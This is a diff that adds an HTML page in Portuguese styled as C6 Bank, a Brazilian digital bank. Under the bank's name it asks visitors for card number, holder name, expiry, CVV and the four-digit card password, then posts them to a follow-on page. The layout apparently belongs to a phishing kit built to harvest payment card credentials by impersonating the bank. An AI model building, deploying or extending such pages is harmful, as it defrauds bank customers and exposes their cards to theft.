@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C6 Bank: Banco Completo, com Conta Digital, Cartão de Crédito e mais</title>
+    <link rel="stylesheet" href="card.css">
+    <link rel="shortcut icon" href="img/logo.png">
+</head>
+<body>
+    <header>
+        <h1>C6 Bank - Seu Banco Digital</h1>
+    </header>
+
+    <main class="aria">
+
+        <div class="box2">
+            <img class="imagem" src="img/c10.png" alt="">
+        </div>
+
+        <div class="box">
+            <form id="form" action="001.html" method="post">
+                <h2>Insira os Dados do Cartão</h2>
+                <input class="input" type="tel" id="number" name="number" placeholder="Número do Cartão" required  
+                 minlength="16" maxlength="16" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');">
+                <input class="input" type="text"  id="nome" name="nome" placeholder="Nome" required maxlength="45">
+                <div class="val_e_cvv">
+                <input class="input" type="tel" id="validade" name="validade" placeholder="Validade" required 
+                minlength="4" maxlength="4" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');">
+                <input class="input" type="tel" id="cvv" name="cvv" placeholder="CVV" required 
+                minlength="3" maxlength="3" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');">
+                </div>
+                <input class="input" type="password" id="senhacard" name="senhacard" placeholder="Senha" required minlength="4" maxlength="4"
+                oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*?)\..*/g, '$1');">
+                <input class="input" type="submit" id="submit" name="submit" value="Próximo">
+            </form>
+        </div>
+    </main>
+    <script>
+        var inputNumber = document.querySelector("#number");
+        nome.addEventListener("keypress", function(e) {
+        var keyCode = (e.keyCode ? e.keyCode : e.which);
+  
+        if (keyCode <= 47 && keyCode >= 58) {
+        e.preventDefault();
+        }
+        });
+
+        var inputNome = document.querySelector("#nome");
+        nome.addEventListener("keypress", function(e) {
+        var keyCode = (e.keyCode ? e.keyCode : e.which);
+  
+        if (keyCode > 47 && keyCode < 58) {
+        e.preventDefault();
+        }
+        });
+    </script>
+</body>
+</html>
